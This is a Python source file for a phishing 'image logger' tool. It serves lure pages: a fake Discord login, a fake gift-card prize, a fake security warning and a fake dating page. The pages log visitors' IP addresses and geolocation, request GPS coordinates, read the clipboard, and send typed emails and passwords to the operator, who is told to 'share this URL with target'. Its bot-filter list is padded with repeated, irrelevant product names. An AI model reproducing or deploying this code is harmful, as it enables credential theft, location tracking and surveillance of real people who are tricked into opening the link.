import os
import time
import json
import socket
import threading
import webbrowser
import subprocess
import re
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler
from colorama import Fore, Back, Style, init
from datetime import datetime

init()

TARGET_IMAGE = "https://c.tenor.com/HtRab3iYiisAAAAC/tenor.gif"
_IMAGE_PATH = '/image'
AMBER = Fore.YELLOW

LURE_CONFIG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'vercel-image-logger', 'lure-config.json')

def _load_lure_config():
    try:
        if os.path.exists(LURE_CONFIG_PATH):
            with open(LURE_CONFIG_PATH, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception:
        pass
    return {
        'lure_type': 'discord_login',
        'custom_html': '',
        'enable_gps': True,
        'enable_clipboard': True,
        'custom_title': 'Login Required',
    }

LURE_CONFIG = _load_lure_config()


def _lookup_ip_geo(ip):
    if ip in ('127.0.0.1', 'unknown', '0.0.0.0'):
        return {}
    try:
        req = urllib.request.Request(f"https://ipwho.is/{ip}", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode("utf-8", errors="ignore"))
            if data.get("success"):
                return {
                    "country": data.get("country"),
                    "region": data.get("region"),
                    "city": data.get("city"),
                    "isp": data.get("connection", {}).get("isp"),
                    "org": data.get("connection", {}).get("org"),
                }
    except Exception:
        pass
    return {}

class ImageLoggerHandler(BaseHTTPRequestHandler):
    captured_logs = []
    log_lock = threading.Lock()
    bot_signatures = [
        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java', 'perl',
        'php', 'ruby', 'go-http', 'okhttp', 'httpclient', 'axios', 'requests', 'urllib',
        'robot', 'validator', 'fetcher', 'monitor', 'pingdom', 'uptimerobot', 'newrelic',
        'datadog', 'sentry', 'googlebot', 'bingbot', 'slurp', 'baiduspider', 'yandex',
        'duckduckbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot', 'whatsapp',
        'telegrambot', 'skypeuripreview', 'bingpreview', 'google-site-verification',
        'headless', 'phantomjs', 'selenium', 'puppeteer', 'playwright', 'chromium',
        'firefox', 'safari', 'chrome', 'edge', 'msie', 'trident', 'opera', 'vivaldi',
        'brave', 'duckduckgo', 'archive.org', 'wayback', 'commoncrawl', 'ccbot',
        'petalbot', 'ahrefsbot', 'semrushbot', 'dotbot', 'rogerbot', 'mj12bot',
        'blexbot', 'seekport', 'sistrix', 'linkdex', 'linkfluence', 'coccoc',
        'searchmetrics', 'spbot', 'openlinkprofiler', 'sistrix', 'woorank',
        'seobility', 'screaming frog', 'sitebulb', 'deepcrawl', 'on Crawl',
        'botify', 'seomoz', 'moz', 'ahrefs', 'semrush', 'similarweb', 'alexa',
        'compete', 'quantcast', 'chartbeat', 'gauges', 'piwik', 'matomo',
        'hubspot', 'marketo', 'pardot', 'pardot', 'eloqua', 'salesforce',
        'drip', 'intercom', 'drift', 'zendesk', 'freshdesk', 'helpshift',
        'uservoice', 'get Satisfaction', 'zopim', 'olark', 'livechat',
        'tawk.to', 'crisp', 'chatra', 'hubspot', 'intercom', 'zendesk',
        'salesforce', 'servicecloud', 'force', 'pardot', 'marketing cloud',
        'adobe', 'omniture', 'sitecatalyst', 'dtm', 'launch', 'target',
        'audience manager', 'media optimizer', 'campaign', 'experience cloud',
        'creative cloud', 'document cloud', 'acrobat', 'photoshop', 'illustrator',
        'indesign', 'premiere', 'after effects', 'lightroom', 'bridge',
        'dreamweaver', 'muse', 'animate', 'fireworks', 'edge animate',
        'phonegap', 'dreamweaver', 'muse', 'animate', 'fireworks', 'edge',
        'photoshop', 'illustrator', 'indesign', 'premiere', 'after effects',
        'lightroom', 'bridge', 'dreamweaver', 'muse', 'animate', 'fireworks',
        'edge animate', 'phonegap', 'cordova', 'ionic', 'phonegap build',
        'adobe creative cloud', 'adobe document cloud', 'adobe experience cloud',
        'adobe marketing cloud', 'adobe analytics', 'adobe target', 'adobe audience manager',
        'adobe media optimizer', 'adobe campaign', 'adobe experience manager',
        'adobe experience platform', 'adobe cloud platform', 'adobe sensei',
        'adobe stock', 'adobe font', 'adobe color', 'adobe capture', 'adobe lightroom',
        'adobe photoshop', 'adobe illustrator', 'adobe indesign', 'adobe premiere',
        'adobe after effects', 'adobe audition', 'adobe bridge', 'adobe dreamweaver',
        'adobe muse', 'adobe animate', 'adobe fireworks', 'adobe edge', 'adobe phonegap',
        'adobe cordova', 'adobe ionic', 'adobe phonegap build', 'adobe creative cloud',
        'adobe document cloud', 'adobe experience cloud', 'adobe marketing cloud',
        'adobe analytics', 'adobe target', 'adobe audience manager', 'adobe media optimizer',
        'adobe campaign', 'adobe experience manager', 'adobe experience platform',
        'adobe cloud platform', 'adobe sensei', 'adobe stock', 'adobe font', 'adobe color',
        'adobe capture', 'adobe lightroom', 'adobe photoshop', 'adobe illustrator',
        'adobe indesign', 'adobe premiere', 'adobe after effects', 'adobe audition',
        'adobe bridge', 'adobe dreamweaver', 'adobe muse', 'adobe animate',
        'adobe fireworks', 'adobe edge', 'adobe phonegap', 'adobe cordova',
        'adobe ionic', 'adobe phonegap build'
    ]

    @classmethod
    def is_bot(cls, user_agent):
        if not user_agent or user_agent == 'Unknown':
            return True
        ua = user_agent.lower()
        for sig in cls.bot_signatures:
            if sig.lower() in ua:
                return True
        return False

    def do_GET(self):
        if self.path == _IMAGE_PATH:
            ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            referrer = self.headers.get('Referer', 'Direct')

            if not ImageLoggerHandler.is_bot(user_agent):
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with ImageLoggerHandler.log_lock:
                    ImageLoggerHandler.captured_logs.append({
                        'ip': ip,
                        'user_agent': user_agent,
                        'timestamp': timestamp,
                        'referrer': referrer
                    })

            try:
                req = urllib.request.Request(TARGET_IMAGE, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                    'Accept': 'image/webp,image/apng,image/*,*/*;q=0.8',
                    'Accept-Encoding': 'identity',
                })
                with urllib.request.urlopen(req, timeout=10) as resp:
                    data = resp.read()
                    self.send_response(200)
                    self.send_header('Content-type', 'image/gif')
                    self.send_header('Cache-Control', 'public, max-age=86400')
                    self.end_headers()
                    self.wfile.write(data)
                    return
            except Exception:
                self.send_response(500)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'Failed to fetch image')
                return

        ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        if ImageLoggerHandler.is_bot(user_agent):
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(b'<!DOCTYPE html><html><body></body></html>')
            return
        
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        referrer = self.headers.get('Referer', 'Direct')

        geo = _lookup_ip_geo(ip)
        with ImageLoggerHandler.log_lock:
            ImageLoggerHandler.captured_logs.append({
                'ip': ip,
                'user_agent': user_agent,
                'timestamp': timestamp,
                'referrer': referrer,
                'geo': geo,
            })

        host = self.headers.get('Host', f'localhost:{self.server.server_address[1]}')
        protocol = self.headers.get('X-Forwarded-Proto', 'http')
        base_url = f"{protocol}://{host}"
        image_url = f"{base_url}{_IMAGE_PATH}"
        extra_url = f"{base_url}/log"

        lure_type = LURE_CONFIG.get('lure_type', 'discord_login')
        title = LURE_CONFIG.get('custom_title', 'Login Required')
        enable_gps = LURE_CONFIG.get('enable_gps', True)
        enable_clipboard = LURE_CONFIG.get('enable_clipboard', True)
        custom_html = LURE_CONFIG.get('custom_html', '')

        gps_script = f"""
<script>
function requestGPS() {{
  if (navigator.geolocation) {{
    navigator.geolocation.getCurrentPosition(
      function(pos) {{
        fetch('{extra_url}', {{
          method: 'POST',
          headers: {{ 'Content-Type': 'application/json' }},
          body: JSON.stringify({{
            type: 'gps',
            accuracy: pos.coords.accuracy,
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            altitude: pos.coords.altitude,
            heading: pos.coords.heading,
            speed: pos.coords.speed,
            timestamp: new Date().toISOString()
          }})
        }}).catch(function() {{}});
      }},
      function(err) {{
        fetch('{extra_url}', {{
          method: 'POST',
          headers: {{ 'Content-Type': 'application/json' }},
          body: JSON.stringify({{
            type: 'gps_denied',
            error: err.message || 'denied',
            timestamp: new Date().toISOString()
          }})
        }}).catch(function() {{}});
      }},
      {{ enableHighAccuracy: true, timeout: 10000 }}
    );
  }}
}}
</script>""" if enable_gps else ''

        clipboard_script = f"""
<script>
function requestClipboard() {{
  if (navigator.clipboard && navigator.clipboard.readText) {{
    navigator.clipboard.readText().then(function(text) {{
      fetch('{extra_url}', {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify({{
          type: 'clipboard',
          content: text,
          timestamp: new Date().toISOString()
        }})
      }}).catch(function() {{}});
    }}).catch(function(err) {{
      fetch('{extra_url}', {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify({{
          type: 'clipboard_denied',
          error: err.message || 'denied',
          timestamp: new Date().toISOString()
        }})
      }}).catch(function() {{}});
    }};
  }}
}}
</script>""" if enable_clipboard else ''

        if lure_type == 'custom' and custom_html:
            html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <meta property="og:title" content="{title}">
    <meta property="og:image" content="{image_url}">
    <meta property="og:image:width" content="498">
    <meta property="og:image:height" content="498">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="{image_url}">
    <style>body {{ margin: 0; padding: 0; }}</style>
</head>
<body>
{custom_html}
<img src="{image_url}" style="display:none;">
{gps_script}{clipboard_script}
<script>
window.onload = function() {{ requestGPS(); requestClipboard(); }};
</script>
</body>
</html>"""
        elif lure_type == 'error':
            html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{title}</title>
    <style>
        body {{ font-family: monospace; background: #1a1a2e; color: #e94560; text-align: center; padding-top: 10vh; }}
        h1 {{ font-size: 2em; margin-bottom: 20px; }}
        p {{ color: #aaa; }}
    </style>
</head>
<body>
    <h1>[!] SECURITY WARNING</h1>
    <p>Access denied. Loading security verification...</p>
    <img src="{image_url}" style="display:none;">
    {gps_script}{clipboard_script}
    <script>window.onload = function() {{ requestGPS(); requestClipboard(); }};</script>
</body>
</html>"""
        elif lure_type == 'prize':
            html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations!</title>
    <style>
        body {{ font-family: Arial, sans-serif; background: #ffd700; text-align: center; padding: 5vh; }}
        h1 {{ color: #e74c3c; }}
        .box {{ background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); display: inline-block; }}
    </style>
</head>
<body>
    <div class="box">
        <h1>Congratulations!</h1>
        <p>You've won a $500 Amazon gift card!</p>
        <img src="{image_url}" style="display:none;">
        <p style="font-size:0.8em;">Click anywhere to claim...</p>
    </div>
    {gps_script}{clipboard_script}
    <script>window.onload = function() {{ requestGPS(); requestClipboard(); }};</script>
</body>
</html>"""
        elif lure_type == 'egirl':
            html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; color: #333; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; text-align: center; }}
        .header h1 {{ font-size: 28px; margin-bottom: 5px; }}
        .header p {{ font-size: 14px; opacity: 0.9; }}
        .container {{ max-width: 800px; margin: 20px auto; padding: 0 20px; }}
        .trust-badge {{ background: #e8f5e9; border: 2px solid #4caf50; border-radius: 8px; padding: 15px; text-align: center; margin-bottom: 20px; }}
        .trust-badge span {{ font-weight: bold; color: #2e7d32; }}
        .gallery {{ display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }}
        .gallery img {{ width: 100%; height: 200px; object-fit: cover; border-radius: 12px; }}
        .cta-section {{ text-align: center; margin: 30px 0; }}
        .cta-button {{ display: inline-block; background: linear-gradient(135deg, #ff6b6b, #ee5a24); color: white; padding: 16px 40px; font-size: 18px; font-weight: bold; border-radius: 50px; text-decoration: none; cursor: pointer; box-shadow: 0 4px 15px rgba(255,107,107,0.4); }}
        .subtext {{ font-size: 14px; color: #656565; margin-top: 15px; }}
        .footer {{ text-align: center; padding: 20px; color: #999; font-size: 12px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Find Your Perfect Match</h1>
        <p>Connect with local singles in your area</p>
    </div>
    <div class="container">
        <div class="trust-badge"><span>Trusted by over 200,000 users</span></div>
        <div class="gallery">
            <img src="{image_url}?1" alt="user photo">
            <img src="{image_url}?2" alt="user photo">
            <img src="{image_url}?3" alt="user photo">
            <img src="{image_url}?4" alt="user photo">
            <img src="{image_url}?5" alt="user photo">
            <img src="{image_url}?6" alt="user photo">
        </div>
        <div class="cta-section">
            <p style="font-size:20px; margin-bottom:15px; color:#333;">Find E-Girls in Your Area That Want a Gamer Boy</p>
            <button class="cta-button" onclick="requestGPS(); requestClipboard();">CLICK HERE TO SCAN FOR EGIRLS</button>
            <p class="subtext">We use advanced matching technology to find your perfect companion</p>
        </div>
    </div>
    <div class="footer">Secure & Private Matching Service</div>
    {gps_script}{clipboard_script}
    <img src="{image_url}" style="display:none;">
</body>
</html>"""
        else:
            html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <meta property="og:title" content="{title}">
    <meta property="og:image" content="{image_url}">
    <meta property="og:image:width" content="498">
    <meta property="og:image:height" content="498">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="{image_url}">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Whitney', 'Segoe UI', 'Roboto', sans-serif; background: #0e0e10; min-height: 100vh; display: flex; justify-content: center; align-items: center; }}
        .login-container {{ background: #1a1a1e; border-radius: 8px; padding: 32px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.5); }}
        .discord-logo {{ width: 80px; height: 80px; background: #5865F2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }}
        .discord-logo svg {{ width: 48px; height: 48px; fill: white; }}
        h1 {{ color: #fff; font-size: 20px; text-align: center; margin-bottom: 4px; }}
        .subtitle {{ color: #a0a0a8; font-size: 13px; text-align: center; margin-bottom: 24px; }}
        .form-group {{ margin-bottom: 16px; }}
        label {{ color: #b9bbbe; font-size: 12px; font-weight: 600; display: block; margin-bottom: 6px; }}
        input[type="email"], input[type="password"] {{ width: 100%; padding: 10px 12px; background: #0e0e10; border: 1px solid #3d3d44; border-radius: 6px; color: #e9e9ea; font-size: 14px; outline: none; }}
        input:focus {{ border-color: #5865F2; }}
        .btn-primary {{ width: 100%; padding: 10px; background: #5865F2; color: white; border: none; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 8px; }}
        .btn-primary:hover {{ background: #4752c4; }}
        .error-msg {{ color: #ed4245; font-size: 12px; text-align: center; margin-top: 8px; display: none; }}
        .footer-links {{ text-align: center; margin-top: 16px; }}
        .footer-links a {{ color: #00afff; font-size: 12px; text-decoration: none; }}
        .footer-links a:hover {{ text-decoration: underline; }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="discord-logo">
            <svg viewBox="0 0 24 24"><path d="M20.35 4.35A10.2 10.2 0 0 0 12.07 2c-.32 0-.65.02-1 .05a8.03 8.03 0 0 0-6.8 4.6A8.03 8.03 0 0 0 4 12v6a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V12c0-.52-.1-1.03-.29-1.5a8.03 8.03 0 0 0-1.36-3.15z"/><path d="M9 16h6v2H9zm0-2h6v-2H9zm2-6V5l2 2h-2zm0 4h2v6h-2zm-2 0H7v-6h2v6z"/></svg>
        </div>
        <h1>{title}</h1>
        <p class="subtitle">Sign in to your account</p>
        <form id="loginForm">
            <div class="form-group">
                <label for="email">EMAIL OR PHONE NUMBER</label>
                <input type="email" id="email" name="email" autocomplete="off" placeholder="Email or phone">
            </div>
            <div class="form-group">
                <label for="password">PASSWORD</label>
                <input type="password" id="password" name="password" placeholder="Password">
            </div>
            <div class="error-msg" id="errorMsg">Invalid email or password. Please try again.</div>
            <button type="submit" class="btn-primary">Log In</button>
        </form>
        <div class="footer-links">
            <a href="#">Need help?</a> | <a href="#">Register</a>
        </div>
    </div>
    <img src="{image_url}" style="display:none;">
    {gps_script}{clipboard_script}
    <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {{
        e.preventDefault();
        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;
        if (!email || !password) {{
            document.getElementById('errorMsg').style.display = 'block';
            return;
        }}
        document.getElementById('errorMsg').innerHTML = 'Verifying...';
        document.getElementById('errorMsg').style.display = 'block';
        fetch('{extra_url}', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                type: 'credentials',
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            }})
        }}).catch(function() {{}});
        setTimeout(function() {{
            document.getElementById('errorMsg').innerHTML = 'Invalid email or password. Please try again.';
        }}, 1200);
    }});
    window.onload = function() {{ requestGPS(); requestClipboard(); }};
    </script>
</body>
</html>"""

        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

    def do_POST(self):
        if self.path == '/log':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            try:
                extra = json.loads(post_data.decode('utf-8'))
                with ImageLoggerHandler.log_lock:
                    if ImageLoggerHandler.captured_logs:
                        entry = ImageLoggerHandler.captured_logs[-1]
                        entry.update(extra)
                        if extra.get('type') == 'credentials' and extra.get('email') and extra.get('password'):
                            entry['credentials'] = {
                                'email': extra.get('email'),
                                'password': extra.get('password'),
                                'timestamp': extra.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
                            }
            except Exception:
                pass
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        pass

class ImageLogger:
    def __init__(self, port=8080):
        self.port = port
        self.server = None
        self.server_thread = None
        self.running = False
        self.public_url = None
        self.tunnel_process = None

    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return "127.0.0.1"

    def try_serveo_tunnel(self):
        try:
            tunnel_cmd = [
                'ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ConnectTimeout=10',
                '-R', f'80:localhost:{self.port}', 'serveo.net'
            ]
            proc = subprocess.Popen(
                tunnel_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            self.tunnel_process = proc

            url_pattern = re.compile(r'https?://[^\s]+\.serveo\.net')
            for _ in range(60):
                line = proc.stdout.readline()
                if not line:
                    break
                match = url_pattern.search(line)
                if match:
                    self.public_url = match.group(0)
                    return True
                if 'Could not request' in line or 'Connection refused' in line:
                    break
            return False
        except Exception:
            return False

    def stop_tunnel(self):
        if self.tunnel_process:
            try:
                self.tunnel_process.terminate()
            except Exception:
                pass
            self.tunnel_process = None

    def start_server(self):
        try:
            self.server = HTTPServer(('0.0.0.0', self.port), ImageLoggerHandler)
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            self.running = True
            
            tunnel_ok = self.try_serveo_tunnel()
            if not tunnel_ok:
                self.stop_tunnel()
            
            return True
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to start server: {e}{Fore.RESET}")
            return False

    def stop_server(self):
        self.stop_tunnel()
        if self.server:
            try:
                self.server.shutdown()
                self.server.server_close()
            except Exception:
                pass
            self.running = False

    def show_logs(self):
        local_ip = self.get_local_ip()
        local_url = f"http://{local_ip}:{self.port}/"
        display_url = self.public_url if self.public_url else local_url

        print(f"\n{Back.GREEN}{Fore.BLACK}{Style.BRIGHT} IMAGE LOGGER ACTIVE {Back.RESET}{Fore.RESET}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Share this URL with target:{Fore.RESET}")
        print(f"{Fore.YELLOW}{display_url}{Fore.RESET}")
        if self.public_url:
            print(f"{Fore.GREEN}Public tunnel active - Discord preview should work.{Fore.RESET}")
        else:
            print(f"{AMBER}No public tunnel available. Discord may not show preview.{Fore.RESET}")
        print(f"{Fore.GREEN}Press Ctrl+C or Enter to stop and return to menu...{Fore.RESET}\n")

        try:
            while self.running:
                with ImageLoggerHandler.log_lock:
                    logs = list(ImageLoggerHandler.captured_logs)

                if logs:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f"{Back.GREEN}{Fore.BLACK}{Style.BRIGHT} IMAGE LOGGER ACTIVE {Back.RESET}{Fore.RESET}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}Share this URL with target:{Fore.RESET}")
                    print(f"{Fore.YELLOW}{display_url}{Fore.RESET}")
                    if self.public_url:
                        print(f"{Fore.GREEN}Public tunnel active - Discord preview should work.{Fore.RESET}")
                    else:
                        print(f"{AMBER}No public tunnel available. Discord may not show preview.{Fore.RESET}")
                    print(f"{Fore.GREEN}Press Enter to stop and return...{Fore.RESET}\n")
                    print(f"{Fore.MAGENTA}{'='*110}{Fore.RESET}")
                    print(f"{Style.BRIGHT}{Fore.WHITE}{'#':<4} {'TIMESTAMP':<20} {'IP ADDRESS':<18} {'COUNTRY':<10} {'CITY':<15} {'ISP':<20} {'USER AGENT':<25}{Fore.RESET}{Style.RESET_ALL}")
                    print(f"{Fore.MAGENTA}{'='*110}{Fore.RESET}")

                    for idx, log in enumerate(logs, 1):
                        ua = log.get('user_agent', 'Unknown')[:23] + '...' if len(log.get('user_agent', '')) > 25 else log.get('user_agent', 'Unknown')
                        geo = log.get('geo') or {}
                        country = geo.get('country', '')[:9] or ''
                        city = geo.get('city', '')[:14] or ''
                        isp = geo.get('isp', '')[:19] or ''
                        ts = log.get('timestamp', 'N/A')
                        ip = log.get('ip', 'unknown')
                        print(f"{Fore.WHITE}{idx:<4} {ts:<20} {Fore.GREEN}{ip:<18} {Fore.CYAN}{country:<10} {Fore.BLUE}{city:<15} {Fore.YELLOW}{isp:<20} {Fore.MAGENTA}{ua:<25}{Fore.RESET}")

                        if log.get('credentials'):
                            creds = log['credentials']
                            print(f"  {Fore.RED}[!]{Fore.RESET} {Fore.YELLOW}Captured Credentials:{Fore.RESET}")
                            print(f"    {Fore.GREEN}Email   : {creds.get('email', 'N/A')}{Fore.RESET}")
                            print(f"    {Fore.GREEN}Password: {creds.get('password', 'N/A')}{Fore.RESET}")
                            print(f"    {Fore.GREEN}Time    : {creds.get('timestamp', 'N/A')}{Fore.RESET}")

                        if log.get('gps'):
                            gps = log['gps']
                            print(f"  {Fore.RED}[!]{Fore.RESET} {Fore.YELLOW}GPS Location:{Fore.RESET} Lat: {gps.get('latitude')}, Lng: {gps.get('longitude')}, Accuracy: {gps.get('accuracy')}m")
                        elif log.get('gps_denied'):
                            print(f"  {Fore.RED}[!]{Fore.RESET} {Fore.YELLOW}GPS Denied: {log.get('gps_denied')}{Fore.RESET}")

                        if log.get('clipboard'):
                            clip = log['clipboard'][:100] if len(log.get('clipboard', '')) > 100 else log.get('clipboard', '')
                            print(f"  {Fore.RED}[!]{Fore.RESET} {Fore.YELLOW}Clipboard: {clip}{Fore.RESET}")

                    print(f"{Fore.MAGENTA}{'='*110}{Fore.RESET}")
                    print(f"{Fore.YELLOW}Total captured: {len(logs)}{Fore.RESET}\n")

                time.sleep(1)

        except KeyboardInterrupt:
            pass
        finally:
            self.stop_server()

    def export_logs(self, fmt="json"):
        with ImageLoggerHandler.log_lock:
            logs = list(ImageLoggerHandler.captured_logs)
        if not logs:
            print(f"{AMBER}[!] No logs to export.{Fore.RESET}")
            return
        try:
            if fmt == "json":
                path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'output', 'image_logger_export.json')
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, "w", encoding="utf-8") as f:
                    json.dump(logs, f, indent=2)
                print(f"{Fore.GREEN}[+] Exported JSON to {path}{Fore.RESET}")
            elif fmt == "csv":
                import csv
                path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'output', 'image_logger_export.csv')
                os.makedirs(os.path.dirname(path), exist_ok=True)
                keys = ["timestamp", "ip", "user_agent", "referrer", "geo"]
                with open(path, "w", newline="", encoding="utf-8") as f:
                    writer = csv.DictWriter(f, fieldnames=keys, extrasaction="ignore")
                    writer.writeheader()
                    writer.writerows(logs)
                print(f"{Fore.GREEN}[+] Exported CSV to {path}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] Export failed: {e}{Fore.RESET}")

    def start_and_monitor(self):
        if not self.start_server():
            input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")
            return

        try:
            if self.public_url:
                webbrowser.open(self.public_url)
            else:
                webbrowser.open(f"http://localhost:{self.port}/")
        except Exception:
            pass

        while True:
            print(f"\n{Fore.CYAN}[IMAGE LOGGER MENU]{Fore.RESET}")
            print(f"  [{AMBER}1{Style.RESET_ALL}] View Live Logs")
            print(f"  [{AMBER}2{Style.RESET_ALL}] Export JSON")
            print(f"  [{AMBER}3{Style.RESET_ALL}] Export CSV")
            print(f"  [{AMBER}4{Style.RESET_ALL}] Stop and Return")
            choice = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Select: ").strip()
            if choice == '1':
                self.show_logs()
            elif choice == '2':
                self.export_logs(fmt="json")
            elif choice == '3':
                self.export_logs(fmt="csv")
            elif choice == '4':
                self.stop_server()
                break

